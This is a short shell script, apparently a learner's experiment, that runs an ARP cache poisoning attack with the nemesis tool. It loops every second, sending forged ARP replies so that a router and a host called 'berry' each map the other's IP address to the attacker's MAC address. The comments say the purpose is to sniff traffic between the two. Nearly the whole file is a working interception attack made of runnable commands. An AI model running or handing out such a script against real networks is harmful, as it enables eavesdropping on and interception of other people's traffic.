#!/bin/sh

# The purpose of the script is to be able to sniff trafic 
# between the router (192.168.0.1) and berry (192.168.0.3)
# The idea is to 'poison the arp cache' of both machines
# by sending bogus ARP replies whereby creating the wrong
# associations between ip and mac on these machines. Hence 
# we make the router believe that the mac address of berry 
# is our mac address (74:c6:3b:1c:cc:05) and we make berry 
# believe that the mac address of router is our mac address.

# So when berry intends to send a packet to the router, the
# link layer will use the wrong mac address and send the packet
# to us instead (are we then forwarding that packet to router?). 

# When the router intends to send a packet to berry, the 
# link layer will use the wrong mac address and send the packet
# to us instead (are we then forwarding that packet to berry?).


# poisoning arp cache of 192.168.0.3 (b8:27:eb:65:5f:ca)
# by pretending to have ip address 192.168.0.1

poison()
{
sudo nemesis arp -v -r -d wlp3s0 \
  -S 192.168.0.1 -D 192.168.0.3 \
  -h 74:c6:3b:1c:cc:05 -m b8:27:eb:65:5f:ca \
  -H 74:c6:3b:1c:cc:05 -M b8:27:eb:65:5f:ca

# It is possible to check that the arp cache of berry has indeed 
# been poisoned using ssh and the command 'sudo arp -n' which will
# show that the router's ip address (192.168.0.1) has the wrong mac.


# poisoning arp cache of 192.168.0.1 (50:6a:03:04:37:bf)
# by pretending to have ip address 192.168.0.3

sudo nemesis arp -v -r -d wlp3s0 \
  -S 192.168.0.3  -D 192.168.0.1 \
  -h 74:c6:3b:1c:cc:05 -m 50:6a:03:04:37:bf \
  -H 74:c6:3b:1c:cc:05 -M 50:6a:03:04:37:bf
}

while true
do
  poison
  sleep 1
done;


